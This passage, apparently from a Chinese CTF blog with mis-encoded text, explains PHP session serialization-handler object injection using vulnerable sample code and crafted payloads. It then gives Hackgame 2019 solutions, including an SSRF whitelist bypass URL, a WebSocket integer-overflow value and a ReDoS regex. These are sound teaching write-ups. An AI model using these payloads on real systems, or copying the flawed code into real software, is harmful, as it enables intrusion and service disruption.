<code>$_SESSION</code> æ•°æ®ï¼Œåœ¨å­˜å‚¨æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸º <code>php_serialize</code>ï¼Œå­˜å‚¨çš„æ ¼å¼å¦‚ä¸‹ï¼š</p><pre><code>a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</code></pre><p>åœ¨è¯»å–æ•°æ®æ—¶å¦‚æœç”¨çš„ååºåˆ—åŒ–å¤„ç†å™¨ä¸æ˜¯ <code>php_serialize</code>ï¼Œè€Œæ˜¯ <code>php</code> çš„è¯ï¼Œé‚£ä¹ˆååºåˆ—åŒ–åçš„æ•°æ®å°†ä¼šå˜æˆï¼š</p><pre><code>// var_dump($_SESSION);array(1) &#123;  [&quot;a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;&quot;]=&gt;  object(stdClass)#1 (0) &#123;  &#125;&#125;</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡æ³¨å…¥ <code>|</code> å­—ç¬¦ä¼ªé€ äº†å¯¹è±¡çš„åºåˆ—åŒ–æ•°æ®ï¼ŒæˆåŠŸå®ä¾‹åŒ–äº† <code>stdClass</code> å¯¹è±¡</p><p>é‚£ä¹ˆå°±å­˜åœ¨ä¸¤ç§æƒ…å†µï¼š</p><p><strong>å½“ session.auto_startï¼Off æ—¶</strong></p><p>å½“é…ç½®é€‰é¡¹ session.auto_startï¼Offï¼Œå­˜åœ¨ä¸¤ä¸ªè„šæœ¬æ³¨å†Œ Session ä¼šè¯æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸åŒï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜ï¼Œå¦‚ä¸‹é¢çš„ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;foo1.php</span><br><span class="line"></span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[&#39;ryat&#39;] &#x3D; $_GET[&#39;ryat&#39;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;foo2.php</span><br><span class="line"></span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</span><br><span class="line">&#x2F;&#x2F;or session.serialize_handler set to php in php.ini </span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">class ryat &#123;</span><br><span class="line">var $hi;</span><br><span class="line"></span><br><span class="line">function __wakeup() &#123;</span><br><span class="line">echo &#39;hi&#39;;</span><br><span class="line">&#125;</span><br><span class="line">function __destruct() &#123;</span><br><span class="line">echo $this-&gt;hi;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“è®¿é—® foo1.php æ—¶ï¼Œæäº¤æ•°æ®å¦‚ä¸‹ï¼š</p><pre><code>foo1.php?ryat=|O:4:&quot;ryat&quot;:1:&#123;s:2:&quot;hi&quot;;s:4:&quot;ryat&quot;;&#125;</code></pre><p>è„šæœ¬ä¼šæŒ‰ç…§ php_serialize å¤„ç†å™¨çš„åºåˆ—åŒ–æ ¼å¼å­˜å‚¨æ•°æ®ï¼Œè®¿é—® foo2.php æ—¶ï¼Œåˆ™ä¼šæŒ‰ç…§ php å¤„ç†å™¨çš„ååºåˆ—åŒ–æ ¼å¼è¯»å–æ•°æ®ï¼Œè¿™æ—¶å°†ä¼šååºåˆ—åŒ–ä¼ªé€ çš„æ•°æ®ï¼ŒæˆåŠŸå®ä¾‹åŒ–äº† ryat å¯¹è±¡ï¼Œå¹¶å°†ä¼šæ‰§è¡Œç±»ä¸­çš„ <code>__wakeup</code> æ–¹æ³•å’Œ <code>__destruct</code> æ–¹æ³•</p><p><strong>å½“ session.auto_startï¼On æ—¶</strong></p><p>å½“é…ç½®é€‰é¡¹ <code>session.auto_startï¼On</code>ï¼Œä¼šè‡ªåŠ¨æ³¨å†Œ Session ä¼š è¯ï¼Œå› ä¸ºè¯¥è¿‡ç¨‹æ˜¯å‘ç”Ÿåœ¨è„šæœ¬ä»£ç æ‰§è¡Œå‰ï¼Œæ‰€ä»¥åœ¨è„šæœ¬ä¸­è®¾å®š çš„åŒ…æ‹¬åºåˆ—åŒ–å¤„ç†å™¨åœ¨å†…çš„ session ç›¸å…³é…é€‰é¡¹çš„è®¾ç½®æ˜¯ä¸èµ· ä½œç”¨çš„ï¼Œå› æ­¤ä¸€äº›éœ€è¦åœ¨è„šæœ¬ä¸­è®¾ç½®åºåˆ—åŒ–å¤„ç†å™¨é…ç½®çš„ç¨‹åº ä¼šåœ¨ <code>session.auto_startï¼On</code> æ—¶ï¼Œé”€æ¯è‡ªåŠ¨ç”Ÿæˆçš„ Session ä¼š è¯ï¼Œç„¶åè®¾ç½®éœ€è¦çš„åºåˆ—åŒ–å¤„ç†å™¨ï¼Œå†è°ƒç”¨ session_start() å‡½ æ•°æ³¨å†Œä¼šè¯ï¼Œè¿™æ—¶å¦‚æœè„šæœ¬ä¸­è®¾ç½®çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸ php.ini ä¸­ è®¾ç½®çš„ä¸åŒï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜,å¦‚ä¸‹é¢çš„ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;foo.php</span><br><span class="line"></span><br><span class="line">if (ini_get(&#39;session.auto_start&#39;)) &#123;</span><br><span class="line">session_destroy();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[&#39;ryat&#39;] &#x3D; $_GET[&#39;ryat&#39;];</span><br></pre></td></tr></table></figure><p>å½“ç¬¬ä¸€æ¬¡è®¿é—®è¯¥è„šæœ¬ï¼Œå¹¶æäº¤æ•°æ®å¦‚ä¸‹ï¼š</p><pre><code>foo.php?ryat=|O:8:&quot;stdClass&quot;:0:&#123;&#125;</code></pre><p>è„šæœ¬ä¼šæŒ‰ç…§ php_serialize å¤„ç†å™¨çš„åºåˆ—åŒ–æ ¼å¼å­˜å‚¨æ•°æ®ï¼š</p><pre><code>a:1:&#123;s:4:&quot;ryat&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</code></pre><p>å½“ç¬¬äºŒæ¬¡è®¿é—®è¯¥è„šæœ¬æ—¶ï¼ŒPHP ä¼šæŒ‰ç…§ php.ini é‡Œè®¾ç½®çš„åºåˆ—åŒ–å¤„ç†å™¨ååºåˆ—åŒ–å­˜å‚¨çš„æ•°æ®ï¼Œè¿™æ—¶å¦‚æœ php.ini é‡Œè®¾ç½®çš„æ˜¯ php å¤„ç†å™¨çš„è¯ï¼Œå°†ä¼šååºåˆ—åŒ–ä¼ªé€ çš„æ•°æ®ï¼ŒæˆåŠŸå®ä¾‹åŒ–äº† stdClass å¯¹è±¡ï¼šï¼‰</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå› ä¸º PHP è‡ªåŠ¨æ³¨å†Œ Session ä¼šè¯æ˜¯åœ¨è„šæœ¬æ‰§è¡Œå‰ï¼Œæ‰€ä»¥é€šè¿‡è¯¥æ–¹å¼åªèƒ½æ³¨å…¥ PHP çš„å†…ç½®ç±»ã€‚</p><h3 id="Jarvisojä¸Šçš„ä¸€é“é¢˜"><a href="#Jarvisojä¸Šçš„ä¸€é“é¢˜" class="headerlink" title="Jarvisojä¸Šçš„ä¸€é“é¢˜"></a>Jarvisojä¸Šçš„ä¸€é“é¢˜</h3><p>å…·ä½“å‚è€ƒï¼š<a href="http://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/">http://www.moonback.xyz/2019/10/05/jarvisoj-web-wp/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackgame2019éƒ¨åˆ†é¢˜ç›®writeup</title>
      <link href="2019/10/26/hackgame-wp/"/>
      <url>2019/10/26/hackgame-wp/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†hackgame2019éƒ¨åˆ†é¢˜ç›®çš„writeup!</p><a id="more"></a><h2 id="ç™½ä¸å¤œ"><a href="#ç™½ä¸å¤œ" class="headerlink" title="ç™½ä¸å¤œ"></a>ç™½ä¸å¤œ</h2><p>å°†å›¾ç‰‡downä¸‹æ¥ï¼Œç”¨Stegsolveæ‰“å¼€</p><p><img src="/2019/10/26/hackgame-wp/20191026231318.png"></p><h2 id="ä¿¡æ¯å®‰å…¨-2077"><a href="#ä¿¡æ¯å®‰å…¨-2077" class="headerlink" title="ä¿¡æ¯å®‰å…¨ 2077"></a>ä¿¡æ¯å®‰å…¨ 2077</h2><p>æŠ“åˆ°poståŒ…ï¼Œå°†<code>If-Unmodified-Since</code>æ”¹æˆ2077ä¹‹å</p><p><img src="/2019/10/26/hackgame-wp/20191026231622.png"></p><h2 id="å®‡å®™ç»ˆæé—®é¢˜"><a href="#å®‡å®™ç»ˆæé—®é¢˜" class="headerlink" title="å®‡å®™ç»ˆæé—®é¢˜"></a>å®‡å®™ç»ˆæé—®é¢˜</h2><h3 id="42"><a href="#42" class="headerlink" title="42"></a>42</h3><p><a href="https://www.huxiu.com/article/317268.html">Googleä¸€ä¸‹</a>å°±çŸ¥é“äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Give me 3 integers, x, y, and z, such that</span><br><span class="line">x^3 + y^3 + z^3 &#x3D; 42</span><br></pre></td></tr></table></figure><pre><code>42 = (-80538738812075974)Â³  + 80435758145817515Â³ + 12602123297335631Â³</code></pre><h3 id="Everything"><a href="#Everything" class="headerlink" title="Everything"></a>Everything</h3><p>è¿˜æ˜¯<a href="https://www.alpertron.com.ar/FCUBES.HTM">Googleä¸€ä¸‹</a>å°±å‡ºæ¥äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Since you already know the Answer to Everything, could you give me 8 integers, a, b, c, d, i, j, k and l, such that</span><br><span class="line">a^3 + b^3 + c^3 + d^3 &#x3D; i^2 + j^2 + k^2 + l^2 &#x3D; random_prime(2^256) * random_prime(2^256) &#x3D; 2696202144446753329066703065018205556554521178594549469403210892619232428137856502450273212093761946616284001286324448308517304228289606401398114121525169</span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªæ±‚è§£é¡µé¢ï¼š<a href="https://www.alpertron.com.ar/FSQUARES.HTM">å››å¹³æ–¹</a> <a href="https://www.alpertron.com.ar/FCUBES.HTM">å››ç«‹æ–¹</a></p><p><img src="/2019/10/26/hackgame-wp/20191030231320.png"></p><p><img src="/2019/10/26/hackgame-wp/20191030231450.png"></p><h3 id="Last-question"><a href="#Last-question" class="headerlink" title="Last question"></a>Last question</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">The last question is beyond Everything, but still you can try to solve it, by giving me 2 integers, p and q, such that</span><br><span class="line">p^2 + q^2 &#x3D; randint(2^256) &#x3D; 16803108896636432087843597567919881272571173380668774706039248650282590651651</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜å°±å¯ä»¥å¤šè¯•å‡ æ¬¡ï¼Œä¸å¯èƒ½æ‰€æœ‰çš„éšæœºæ•°éƒ½å¯ä»¥è¢«åˆ†æˆ4ä¸ªæ•°çš„å¹³æ–¹ä¹‹å’Œï¼Œæœ‰çš„åªèƒ½åˆ†æˆä¸¤ä¸ª</p><h2 id="ç½‘é¡µè¯»å–å™¨"><a href="#ç½‘é¡µè¯»å–å™¨" class="headerlink" title="ç½‘é¡µè¯»å–å™¨"></a>ç½‘é¡µè¯»å–å™¨</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, render_template, request, send_from_directory</span><br><span class="line">import requests  # well, requests is designed for humans, and I like it.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line">whitelist_hostname &#x3D; [&quot;example.com&quot;,</span><br><span class="line">                     &quot;www.example.com&quot;]</span><br><span class="line">whitelist_scheme &#x3D; [&quot;http:&#x2F;&#x2F;&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def check_hostname(url):</span><br><span class="line">    for i in whitelist_scheme:</span><br><span class="line">        if url.startswith(i):</span><br><span class="line">            url &#x3D; url[len(i):]  # strip scheme</span><br><span class="line">            url &#x3D; url[url.find(&quot;@&quot;) + 1:]  # strip userinfo## æˆªå–è¦@åé¢çš„</span><br><span class="line">            if not url.find(&quot;&#x2F;&quot;) &#x3D;&#x3D; -1:</span><br><span class="line">                url &#x3D; url[:url.find(&quot;&#x2F;&quot;)]  # strip parts after authority## æˆªå–è¦&#x2F;å‰çš„</span><br><span class="line">            if not url.find(&quot;:&quot;) &#x3D;&#x3D; -1:</span><br><span class="line">                url &#x3D; url[:url.find(&quot;:&quot;)]  # strip portè¦:å‰çš„</span><br><span class="line">            if url not in whitelist_hostname:</span><br><span class="line">                return (False, &quot;hostname &#123;&#125; not in whitelist&quot;.format(url))</span><br><span class="line">            return (True, &quot;ok&quot;)</span><br><span class="line">    return (False, &quot;scheme not in whitelist, only &#123;&#125; allowed&quot;.format(whitelist_scheme))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;&quot;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;request&quot;)</span><br><span class="line">def req_route():</span><br><span class="line">    url &#x3D; request.args.get(&#39;url&#39;)</span><br><span class="line">    status, msg &#x3D; check_hostname(url)</span><br><span class="line">    if status is False:</span><br><span class="line">        # print(msg)</span><br><span class="line">        return msg</span><br><span class="line">    try:</span><br><span class="line">        r &#x3D; requests.get(url, timeout&#x3D;2)</span><br><span class="line">        if not r.status_code &#x3D;&#x3D; 200:</span><br><span class="line">            return &quot;We tried accessing your url, but it does not return HTTP 200. Instead, it returns &#123;&#125;.&quot;.format(r.status_code)</span><br><span class="line">        return r.text</span><br><span class="line">    except requests.Timeout:</span><br><span class="line">        return &quot;We tried our best, but it just timeout.&quot;</span><br><span class="line">    except requests.RequestException:</span><br><span class="line">        return &quot;While accessing your url, an exception occurred. There may be a problem with your url.&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&quot;&#x2F;source&quot;)</span><br><span class="line">def get_source():</span><br><span class="line">    return send_from_directory(&quot;&#x2F;static&#x2F;&quot;, &quot;app.py&quot;, as_attachment&#x3D;True)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    app.run(&quot;0.0.0.0&quot;, 8000, debug&#x3D;False)</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ä¸»è¦çš„ç‚¹å°±æ˜¯ URL çš„ parser å’Œ requester çš„ä¸ä¸€è‡´æ€§å¯¼è‡´çš„æ„æ–™ä¹‹å¤–çš„ SSRF é—®é¢˜</p><h3 id="å…³äºURI-ç»Ÿä¸€èµ„æºæ ‡å¿—ç¬¦"><a href="#å…³äºURI-ç»Ÿä¸€èµ„æºæ ‡å¿—ç¬¦" class="headerlink" title="å…³äºURI(ç»Ÿä¸€èµ„æºæ ‡å¿—ç¬¦)"></a>å…³äºURI(ç»Ÿä¸€èµ„æºæ ‡å¿—ç¬¦)</h3><p>URLï¼ˆç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼‰æ˜¯ URI æœ€å¸¸è§çš„ä¸€ç§å½¢å¼ï¼Œè€Œ URL å°±æ˜¯æˆ‘ä»¬å¸¸è¯´çš„ã€Œç½‘å€ã€</p><p>URI çš„è¯­æ³•å¤§æ¦‚é•¿æˆä¸‹é¢è¿™ä¸ªæ ·å­ï¼š</p><pre><code>scheme:[//authority]path[?query][#fragment]</code></pre><p>å…¶ä¸­ç”¨ [] å›´ä½çš„æ˜¯å¯é€‰çš„ã€‚ç„¶åæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹å„éƒ¨åˆ†ï¼š</p><ol><li>åè®® (scheme)ï¼šè®¿é—®èµ„æºä½¿ç”¨çš„åè®®ï¼Œæ¯”å¦‚è¯´ http, https ä¹‹ç±»çš„ã€‚</li><li>æ¥æº (authority)ï¼šæ¥æºä¸­åŒ…å«äº†ä¸»æœºåï¼Œå’Œå¯é€‰çš„ç”¨æˆ·ä¿¡æ¯å’Œç«¯å£å·ï¼Œæ¯”å¦‚ <code>www.ustc.edu.cn</code>, <code>admin:admin@www.example.com:2333</code>ï¼ˆä½¿ç”¨ç”¨æˆ·åä¸º adminï¼Œå¯†ç ä¸º adminï¼Œè®¿é—® <a href="http://www.example.com/">www.example.com</a> çš„ 2333 ç«¯å£è·å–èµ„æºï¼‰ã€‚</li><li>è·¯å¾„ (path)ï¼šæ¯”å¦‚è¯´ <code>/cgi-bin</code>, <code>/a/b/c/d/e/f/g</code> ç­‰ï¼Œæœ‰ç­‰çº§ (hierarchical) å…³ç³»ã€‚</li><li>æŸ¥è¯¢ (query)ï¼šæ²¡æœ‰ç­‰çº§ (non-hierarchical) å…³ç³»çš„æ•°æ®ã€‚ä¸€èˆ¬æ¥è¯´ï¼ŒæŸ¥è¯¢ä¸­çš„å‚æ•°ä¼šè¢«ç½‘ç«™çš„åç«¯è·å–åˆ°ï¼Œç„¶åè¿›è¡Œå¯¹åº”çš„å¤„ç†ï¼Œæ¯”å¦‚ <code>?q=keyword</code>ï¼Œ<code>?a=1&amp;b=2</code>ã€‚</li><li>ç‰‡æ®µ (fragment)ï¼šæŒ‡å‘ä¸€ä¸ªæ›´ä½çº§åˆ«çš„èµ„æºï¼Œä¾‹å¦‚ <code>#Examples</code>ï¼Œæµè§ˆå™¨è®¿é—®æ—¶ä¼šæ»šåŠ¨åˆ° id ä¸º Examples çš„æ ‡ç­¾ã€‚å¦‚æœå†™è¿‡å•é¡µé¢åº”ç”¨ (SPA) çš„åŒå­¦å¯èƒ½ä¼šçŸ¥é“ï¼Œä¸€äº›æ¡†æ¶å¤„ç†è·¯ç”±æ—¶ä½¿ç”¨ hash æ¨¡å¼ï¼Œè¿™é‡Œçš„ hash å°±æ˜¯ç‰‡æ®µå¼€å¤´çš„ <code>#</code><h3 id="è§£é¢˜æ–¹æ³•"><a href="#è§£é¢˜æ–¹æ³•" class="headerlink" title="è§£é¢˜æ–¹æ³•"></a>è§£é¢˜æ–¹æ³•</h3></li></ol><p>å¦‚æœæˆ‘ä»¬æ„é€ ä¸€ä¸ªå¥‡æ€ªçš„ URL ä¼šæ€ä¹ˆæ ·ï¼Ÿå¦‚æœæˆ‘ä»¬èƒ½æƒ³åŠæ³•è®© <code>check_hostname</code> è§£é‡Šå‡ºä¸»æœºåä¸º <code>example.com</code> çš„åŒæ—¶ï¼Œè®© <code>requests.get()</code> å®é™…è®¿é—®æˆ‘ä»¬æƒ³è¦çš„åœ°å€ï¼Œé‚£å°±æˆåŠŸäº†ã€‚</p><p>é¢„æœŸè§£å°±ä½¿ç”¨åˆ°äº† fragmentï¼ˆå½“ç„¶ç”¨ <code>?</code> ä¹Ÿæ˜¯å¯ä»¥çš„ï¼‰ã€‚ç°æœ‰çš„ requester éƒ½ä¼šç›´æ¥å¿½ç•¥æ‰ <code>#</code> åé¢çš„ä¸œè¥¿ï¼Œæ¯•ç«Ÿè¿™å¯¹è¯·æ±‚ç½‘ç«™å†…å®¹æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚ä½†è¿™é‡Œçš„ä»£ç æ²¡æœ‰å¯¹ <code>#</code> è¿›è¡Œä»»ä½•å¤„ç†ï¼Œè€Œä¸”ä¼šç²—æš´åœ°å¿½ç•¥æ‰ <code>@</code> å‰é¢çš„æ‰€æœ‰å†…å®¹</p><p>å½“æ—¶åšè¿™é“é¢˜ä¸€ç›´æƒ³çš„æ˜¯ä¸‹é¢è¿™ä¸ªæ€è·¯ï¼Œè¯•äº†å¥½ä¹…æ‰æˆåŠŸ</p><pre><code>http://www.baidu.com@10.10.10.10ä¸http://10.10.10.10 è¯·æ±‚æ˜¯ç›¸åŒçš„</code></pre><p>æ‰€ä»¥è¿™é“é¢˜çš„payload:</p><pre><code>http://web1/flag#@example.comæˆ–http://web1/flag?@example.com</code></pre><h2 id="è¾¾æ‹‰å´©å§å¤§å†’é™©"><a href="#è¾¾æ‹‰å´©å§å¤§å†’é™©" class="headerlink" title="è¾¾æ‹‰å´©å§å¤§å†’é™©"></a>è¾¾æ‹‰å´©å§å¤§å†’é™©</h2><p>è¿™é¢˜æˆ‘ç¬¬ä¸€æ—¶é—´æƒ³åˆ°çš„å¯èƒ½æ˜¯æ³¨å…¥ç›¸å…³çš„ä¸œè¥¿ï¼Œå› æ­¤æŠ“åŒ…æ”¹åŒ…ï¼Œæœ€åä¹Ÿæ²¡åšå‡ºæ¥</p><h3 id="ä¸€ä¸ªç®€å•çš„æ•´æ•°æº¢å‡ºæ¼æ´"><a href="#ä¸€ä¸ªç®€å•çš„æ•´æ•°æº¢å‡ºæ¼æ´" class="headerlink" title="ä¸€ä¸ªç®€å•çš„æ•´æ•°æº¢å‡ºæ¼æ´"></a>ä¸€ä¸ªç®€å•çš„æ•´æ•°æº¢å‡ºæ¼æ´</h3><p>è§‚å¯Ÿåˆ° WebSocket çš„ JavaScript ä»£ç ä¸­ï¼Œå‘æœåŠ¡å™¨é€šä¿¡çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$(&quot;#send&quot;).click(</span><br><span class="line">    function () &#123;</span><br><span class="line">        let v &#x3D; $(&quot;#input option:selected&quot;).val();</span><br><span class="line">        addMsg(&quot;æˆ‘&quot;, opts[parseInt(v)]);</span><br><span class="line">        ws.send(v)</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>åœ¨â€œæ–™ç†å¤§å¸‚åœºâ€ä¹°é¸¡çš„æ—¶å€™ï¼ŒbpæŠ“åŒ…å½“ <code>v = -1900000000000000000</code> æ—¶å€™ï¼Œåˆ™ä¼šå‘ç”Ÿå¤§æ•´æ•°æº¢å‡ºï¼Œå¹¶ä½¿å¾—è‡ªå·±çš„æ”»å‡»åŠ›æº¢å‡ºï¼Œè€ŒåæŒ‘æˆ˜æ¶é¾™å³å¯ã€‚</p><p>è¿™ä¸ªæ˜¯çœŸçš„æƒ³ä¸åˆ°ï¼Œæ‰€ä»¥è¯´ä»¥ååšé¢˜è¿˜è¦æ”¾å¼€æ€ç»´</p><h2 id="Happy-LUG"><a href="#Happy-LUG" class="headerlink" title="Happy LUG"></a>Happy LUG</h2><p>ç›´æ¥ç”¨Chromeæˆ–Firefoxè®¿é—®</p><pre><code>ğŸ˜‚.hack.ustclug.org</code></pre><p>ä¼šè‡ªåŠ¨è½¬æˆ</p><pre><code>xn--g28h.hack.ustclug.org</code></pre><p>è¿™é‡Œæ˜¯ <code>Unicode</code>çš„ä¸€ä¸ªåŸŸåç¼–ç æ–¹æ¡ˆ <code>Punycode</code>ï¼Œ<code>ğŸ˜‚</code>ä¼šè¢«ç¼–ç æˆ <code>xn--g28h</code></p><p>å¦ä¸€ä¸ªè€ƒç‚¹å°±æ˜¯ DNS è®°å½•ã€‚ä¸€ä¸ªåŸŸåé™¤äº†å¯ä»¥æŒ‡å‘ä¸€ä¸ªæˆ–å¤šä¸ª IP åœ°å€ï¼ˆA æˆ– AAAA è®°å½•ï¼‰ä¹‹å¤–è¿˜å¯ä»¥åŒ…å«å…¶ä»–ä¿¡æ¯ï¼Œä¾‹å¦‚æŒ‡å‘å¦ä¸€ä¸ªåŸŸåï¼ˆCNAME è®°å½•ï¼‰ï¼ŒæŒ‡ç¤ºæ¥æ”¶é‚®ä»¶çš„æœåŠ¡å™¨ï¼ˆMX è®°å½•ï¼‰ï¼Œæˆ–è€…æä¾›ä»»æ„å­—ç¬¦ä¸²ï¼ˆTXT è®°å½•ï¼‰ç­‰ç­‰</p><p>æœ¬é“é¢˜å°±ç”¨äº†åŸŸåæŒ‡å‘å­—ç¬¦ä¸²è¿™ä¸€ç‚¹ï¼Œå¯ä»¥ä½¿ç”¨nslookupæˆ–è€…dig</p><pre><code>dig TXT xn--g28h.hack.ustclug.org +noidnoutnslookup -q=txt xn--g28h.hack.ustclug.org</code></pre><p><img src="/2019/10/26/hackgame-wp/20191031165614.png"></p><h2 id="æ­£åˆ™éªŒè¯å™¨"><a href="#æ­£åˆ™éªŒè¯å™¨" class="headerlink" title="æ­£åˆ™éªŒè¯å™¨"></a>æ­£åˆ™éªŒè¯å™¨</h2><p>è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯æ­£åˆ™å›æº¯çš„çŸ¥è¯†ç‚¹</p><p>å¯å‚è§<a href="https://en.wikipedia.org/wiki/ReDoS">wiki</a></p><p>è¿™é‡Œæœ‰ä¸ª<a href="https://regex101.com/">æµ‹è¯•æ­£åˆ™çš„å¹³å°</a></p><p>è¿™é‡Œè¯´ä¸‹æ­£åˆ™è¡¨è¾¾å¼<code>*?+</code>çš„ç”¨æ³•</p><ol><li><code>+</code> å·ä»£è¡¨å‰é¢çš„å­—ç¬¦å¿…é¡»è‡³å°‘å‡ºç°ä¸€æ¬¡ï¼ˆ1æ¬¡æˆ–å¤šæ¬¡ï¼‰</li><li><code>*</code> å·ä»£è¡¨å­—ç¬¦å¯ä»¥ä¸å‡ºç°ï¼Œä¹Ÿå¯ä»¥å‡ºç°ä¸€æ¬¡æˆ–è€…å¤šæ¬¡ï¼ˆ0æ¬¡ã€æˆ–1æ¬¡ã€æˆ–å¤šæ¬¡ï¼‰</li><li><code>?</code> é—®å·ä»£è¡¨å‰é¢çš„å­—ç¬¦æœ€å¤šåªå¯ä»¥å‡ºç°ä¸€æ¬¡ï¼ˆ0æ¬¡ã€æˆ–1æ¬¡ï¼‰</li></ol><p>å¯ä»¥ç›´æ¥åˆ©ç”¨</p><pre><code>Regex: (a*)*$String: aaaaaaaaaaaaaaaaaaaaaaab</code></pre><p>è¿™ä¸ªæ­£åˆ™ç”±äºå¤±è´¥æ—¶å›æº¯çš„å­˜åœ¨ï¼Œæ¯å¢åŠ ä¸€ä¸ª a å°±ä¼šä½¿åŒ¹é…æ—¶é—´ç¿»ä¸€å€</p><h2 id="ä¸‰æ•™å¥‡å¦™å¤œ"><a href="#ä¸‰æ•™å¥‡å¦™å¤œ" class="headerlink" title="ä¸‰æ•™å¥‡å¦™å¤œ"></a>ä¸‰æ•™å¥‡å¦™å¤œ</h2><p>è¿™é¢˜è€ƒå¯Ÿçš„æ˜¯è§†é¢‘æå–ä¸åŒçš„å¸§çš„æ“ä½œ</p><p>OpenCV æ˜¯ä¸€ä¸ªè®¡ç®—æœºè§†è§‰åº“ã€‚æˆ‘ä»¬è¿™é‡Œä½¿ç”¨ OpenCV çš„ 